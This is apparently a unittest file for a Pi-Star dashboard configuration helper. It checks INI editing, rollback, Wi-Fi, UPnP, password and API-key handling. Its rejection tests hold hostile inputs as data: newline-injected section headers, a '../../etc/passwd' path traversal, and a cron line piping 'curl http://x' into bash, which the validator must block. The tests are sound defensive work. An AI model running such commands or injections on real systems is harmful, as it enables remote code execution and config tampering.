import importlib.machinery
import importlib.util
import json
import os
from pathlib import Path
import tempfile
import unittest

ROOT = Path(__file__).resolve().parents[2]
TMP = Path(tempfile.mkdtemp())
conf = (ROOT / "Pi-Star_dash_new" / "pistar.conf").read_text()
lines = []
for line in conf.splitlines():
    key = line.partition("=")[0]
    if key.startswith("CONF_") or key in ("DASHBOARD_STATE_DIR", "MARKER_MMDVMHOST", "MARKER_DSTARREPEATER", "HOSTNAME_FILE",
                                          "WPA_SUPPLICANT_CONF", "CRONTAB_FILE", "PISTAR_HOSTS_DIR",
                                          "BM_API_KEY_FILE", "DAPNET_API_KEY_FILE", "TGIF_API_KEY_FILE",
                                          "HOSTS_FILE", "HOSTAPD_CONF", "HOSTAP_OFF_FLAG", "PISTAR_UPNP_SCRIPT",
                                          "WIZARD_CONFIG_DIR"):
        line = f"{key}={TMP / key.lower()}"
    lines.append(line)
settings = TMP / "pistar.conf"
import pwd
lines = [l if not l.startswith("DASHBOARD_ADMIN_USER=") else "DASHBOARD_ADMIN_USER=" + pwd.getpwuid(os.geteuid()).pw_name for l in lines]
settings.write_text("\n".join(lines) + "\n")
os.chmod(settings, 0o644)
os.environ["PISTAR_SETTINGS"] = str(settings)
loader = importlib.machinery.SourceFileLoader("configure_helper", str(Path(__file__).with_name("pistar-configure")))
helper = importlib.util.module_from_spec(importlib.util.spec_from_loader(loader.name, loader))
loader.exec_module(helper)

HOST = """[General]
Callsign=M0ABC
# keep this comment
Id=1234567

[DMR]
Enable=1
ColorCode=1
"""
FLAT = "gatewayCallsign=M0ABC\nircddbPassword=secret\n"


class ConfigureTest(unittest.TestCase):
    def setUp(self):
        for p in TMP.glob("conf_*"):
            p.unlink()
        helper.FILES["mmdvmhost"].write_text(HOST)
        os.chmod(helper.FILES["mmdvmhost"], 0o640)
        helper.FILES["ircddbgateway"].write_text(FLAT)
        self.calls = []

    def run_apply(self, changes, restart=(), revision=None):
        state = helper.read()
        req = {"revision": revision or state["revision"], "changes": changes, "restart": list(restart)}
        return helper.apply(req, run=lambda *a: self.calls.append(a), is_loaded=lambda u: True)

    def test_read(self):
        state = helper.read()
        self.assertEqual(state["files"]["mmdvmhost"]["General"]["Id"], "1234567")
        self.assertEqual(state["files"]["ircddbgateway"][""]["gatewayCallsign"], "M0ABC")
        self.assertNotIn("ysfgateway", state["files"])
        self.assertEqual(state["layout"]["mmdvmhost"], [["General", [["Callsign", "M0ABC"], ["Id", "1234567"]]], ["DMR", [["Enable", "1"], ["ColorCode", "1"]]]])
        self.assertEqual(state["layout"]["ircddbgateway"], [["", [["gatewayCallsign", "M0ABC"], ["ircddbPassword", "secret"]]]])

    def test_apply_keeps_comments_and_mode(self):
        out = self.run_apply({"mmdvmhost": {"DMR": {"ColorCode": "7"}, "General": {"Duplex": "0"}, "Info": {"RXFrequency": "433800000"}},
                              "ircddbgateway": {"": {"gatewayCallsign": "M0XYZ"}}}, restart=["mmdvmhost.service"])
        text = helper.FILES["mmdvmhost"].read_text()
        self.assertIn("# keep this comment", text)
        self.assertIn("ColorCode=7", text)
        self.assertIn("Id=1234567\nDuplex=0\n", text)
        self.assertTrue(text.endswith("[Info]\nRXFrequency=433800000\n"))
        self.assertEqual(oct(helper.FILES["mmdvmhost"].stat().st_mode & 0o777), "0o640")
        self.assertEqual(helper.FILES["ircddbgateway"].read_text(), "gatewayCallsign=M0XYZ\nircddbPassword=secret\n")
        self.assertEqual(self.calls, [("restart", "mmdvmhost.service")])
        self.assertEqual(out["changed"], ["ircddbgateway", "mmdvmhost"])

    def test_rejects(self):
        for changes, restart in (
            ({"mmdvmhost": {"DMR": {"ColorCode": "1\n[Evil]"}}}, []),
            ({"mmdvmhost": {"DMR]\n[X": {"A": "1"}}}, []),
            ({"passwd": {"x": {"y": "z"}}}, []),
            ({"ysfgateway": {"General": {"Callsign": "X"}}}, []),
            ({}, ["ssh.service"]),
        ):
            with self.assertRaises(helper.Error):
                self.run_apply(changes, restart)
        self.assertEqual(helper.FILES["mmdvmhost"].read_text(), HOST)
        with self.assertRaises(helper.Stale):
            self.run_apply({"mmdvmhost": {"DMR": {"ColorCode": "2"}}}, revision="0" * 64)

    def test_rollback_on_restart_failure(self):
        def fail(*a):
            self.calls.append(a)
            if len(self.calls) == 1:
                raise RuntimeError("unit failed")
        state = helper.read()
        with self.assertRaises(helper.Error):
            helper.apply({"revision": state["revision"], "changes": {"mmdvmhost": {"DMR": {"ColorCode": "9"}}},
                          "restart": ["mmdvmhost.service"]}, run=fail, is_loaded=lambda u: True)
        self.assertEqual(helper.FILES["mmdvmhost"].read_text(), HOST)
        self.assertEqual(self.calls, [("restart", "mmdvmhost.service"), ("restart", "mmdvmhost.service")])

    def test_controller_switch_keeps_marker(self):
        helper.MARKERS["mmdvmhost"].write_text("[Modem]\nHardware=zumspotusb\n")
        state = helper.read()
        helper.apply({"revision": state["revision"], "system": {"controller": "dstarrepeater"}}, run=lambda *a: None, is_loaded=lambda u: True)
        self.assertFalse(helper.MARKERS["mmdvmhost"].exists())
        self.assertEqual(helper.MARKERS["dstarrepeater"].read_text(), "[Modem]\nHardware=zumspotusb\n")
        helper.MARKERS["dstarrepeater"].unlink()


class SystemOpsTest(unittest.TestCase):
    def apply(self, system, restart=(), loaded=lambda u: True):
        state = helper.read()
        calls = []
        helper.apply({"revision": state["revision"], "system": system, "restart": list(restart)},
                     run=lambda *a: calls.append(a), is_loaded=loaded)
        return calls

    def test_modem_autoap_psk_upnp(self):
        helper.MARKERS["mmdvmhost"].write_text("")
        helper.MARKERS["dstarrepeater"].unlink(missing_ok=True)
        helper.HOSTAPD.write_text("interface=wlan0\nssid=pi-star\nwpa_passphrase=raspberry\n")
        helper.UPNP.write_text("#!/bin/bash\n\t$DAEMON_PATH$DAEMON -a $ipVar 80 80 TCP\n\t$DAEMON_PATH$DAEMON -a $ipVar 22 22 TCP\n")
        helper.CRONTAB.write_text("*/5 *\t* * *\troot\t/usr/local/sbin/pistar-upnp.service start > /dev/null 2>&1 &\n")
        self.apply({"modem": {"Hardware": "zumspotusb"}, "autoap": "off", "autoap_psk": "newsecret1",
                    "upnp": "off", "upnp_ports": {"80": "on", "22": "off"}})
        self.assertEqual(helper.MARKERS["mmdvmhost"].read_text(), "[Modem]\nHardware=zumspotusb\n")
        self.assertTrue(helper.HOSTAP_OFF.exists())
        self.assertIn("wpa_passphrase=newsecret1\n", helper.HOSTAPD.read_text())
        self.assertIn("\t$DAEMON_PATH$DAEMON -a $ipVar 80 80 TCP", helper.UPNP.read_text())
        self.assertIn("#\t$DAEMON_PATH$DAEMON -a $ipVar 22 22 TCP", helper.UPNP.read_text())
        self.assertTrue(helper.CRONTAB.read_text().startswith("#*/5"))
        self.apply({"autoap": "on", "upnp": "on", "upnp_ports": {"22": "on"}})
        self.assertFalse(helper.HOSTAP_OFF.exists())
        self.assertTrue(helper.CRONTAB.read_text().startswith("*/5"))
        self.assertNotIn("#\t$DAEMON", helper.UPNP.read_text())
        helper.MARKERS["mmdvmhost"].unlink()

    def test_rejects_unknown_or_bad_ops(self):
        for system in ({"reboot": True}, {"autoap_psk": "short"}, {"password": "a:b"}, {"modem": {"Hardware": "x\ny"}},
                       {"upnp_ports": {"8080": "on"}}, {"hostname": "Bad_Host"}, {"timezone": "../../etc/passwd"}):
            with self.assertRaises(helper.Error, msg=str(system)):
                self.apply(system)

    def test_not_installed_units_are_skipped(self):
        calls = self.apply({}, restart=["mmdvmhost.service", "ircddbgateway.service"], loaded=lambda u: u == "mmdvmhost.service")
        self.assertEqual(calls, [("restart", "mmdvmhost.service")])

    def test_password(self):
        (helper.WIZARD_DIR).mkdir(exist_ok=True)
        ran = []
        orig = helper.subprocess.run
        helper.subprocess.run = lambda args, **kw: ran.append(args)
        saved_user = helper.LINUX_USER
        helper.LINUX_USER = "no-such-user-pistar"
        try:
            self.apply({"password": "s3cret pass"})
        finally:
            helper.subprocess.run = orig
            helper.LINUX_USER = saved_user
        self.assertEqual((helper.WIZARD_DIR / "admin-password").read_text(), "s3cret pass\n")
        self.assertEqual(oct((helper.WIZARD_DIR / "admin-password").stat().st_mode & 0o777), "0o600")
        self.assertEqual([a[0] for a in ran], ["/usr/bin/systemd-run"])


class KeysTest(unittest.TestCase):
    def test_seed_and_write(self):
        for p in (helper.KEYS[k][0] for k in helper.KEYS):
            p.unlink(missing_ok=True)
        state = helper.keys_read()["targets"]
        self.assertEqual([t["id"] for t in state], ["bm", "dapnet", "tgif"])
        self.assertEqual(state[1]["sections"], [["DAPNETAPI", [["USER", ""], ["PASS", ""], ["TRXAREA", ""]]]])
        helper.keys_write({"target": "dapnet", "values": {"DAPNETAPI": {"USER": "m0abc", "PASS": "", "TRXAREA": "uk-all"}}})
        path = helper.KEYS["dapnet"][0]
        self.assertEqual(path.read_text(), "[DAPNETAPI]\nUSER=m0abc\nPASS=none\nTRXAREA=uk-all\n\n")
        self.assertEqual(oct(path.stat().st_mode & 0o777), "0o600")
        with self.assertRaises(helper.Error):
            helper.keys_write({"target": "dapnet", "values": {"X": {"a": "1\n[evil]"}}})
        with self.assertRaises(helper.Error):
            helper.keys_write({"target": "shadow", "values": {"X": {"a": "1"}}})


class FullEditTest(unittest.TestCase):
    def setUp(self):
        self.calls = []
        helper.FILES["dmrgateway"].write_text("[General]\nId=1\n")
        os.chmod(helper.FILES["dmrgateway"], 0o640)

    def test_write_restarts_in_order_and_keeps_mode(self):
        rev = helper.full_read("dmrgateway")["revision"]
        out = helper.full_write("dmrgateway", {"revision": rev, "text": "[General]\r\nId=2\r\n"}, run=lambda *a: self.calls.append(a))
        self.assertTrue(out["ok"])
        self.assertEqual(helper.FILES["dmrgateway"].read_text(), "[General]\nId=2\n")
        self.assertEqual(oct(helper.FILES["dmrgateway"].stat().st_mode & 0o777), "0o640")
        self.assertEqual(self.calls, [("restart", "mmdvmhost.service"), ("restart", "dmrgateway.service")])
        with self.assertRaises(helper.Stale):
            helper.full_write("dmrgateway", {"revision": rev, "text": "x"}, run=lambda *a: None)

    def test_cron_rules_block_without_writing(self):
        cron = helper.FULL["cron"][0]
        cron.write_text("# m h dom mon dow user command\n")
        rev = helper.full_read("cron")["revision"]
        bad = "0 * * * * root curl http://x | bash\n# echo base64 in a comment is fine\n5 * * * * root echo ok\n"
        out = helper.full_write("cron", {"revision": rev, "text": bad}, run=lambda *a: None)
        self.assertFalse(out["ok"])
        self.assertEqual(len(out["blocked"]), 1)
        self.assertTrue(out["blocked"][0].startswith("line 1 (pipes downloaded content directly into a shell)"))
        self.assertEqual(cron.read_text(), "# m h dom mon dow user command\n")

    def test_restart_failure_restores_file(self):
        rev = helper.full_read("dmrgateway")["revision"]
        def fail(*a):
            raise RuntimeError("down")
        with self.assertRaises(helper.Error):
            helper.full_write("dmrgateway", {"revision": rev, "text": "[General]\nId=3\n"}, run=fail)
        self.assertEqual(helper.FILES["dmrgateway"].read_text(), "[General]\nId=1\n")

    def test_new_wpa_file_is_private(self):
        wpa = helper.FULL["wpaconfig"][0]
        wpa.unlink(missing_ok=True)
        state = helper.full_read("wpaconfig")
        self.assertFalse(state["exists"])
        class Me:
            pass
        orig = helper.replace
        def replace(path, text, st):  # tests cannot chown to root
            class Own:
                st_uid, st_gid, st_mode = os.geteuid(), os.getegid(), st.st_mode
            orig(path, text, Own)
        helper.replace = replace
        try:
            helper.full_write("wpaconfig", {"revision": state["revision"], "text": "country=GB\n"}, run=lambda *a: None)
        finally:
            helper.replace = orig
        self.assertEqual(oct(wpa.stat().st_mode & 0o777), "0o600")


if __name__ == "__main__":
    unittest.main()
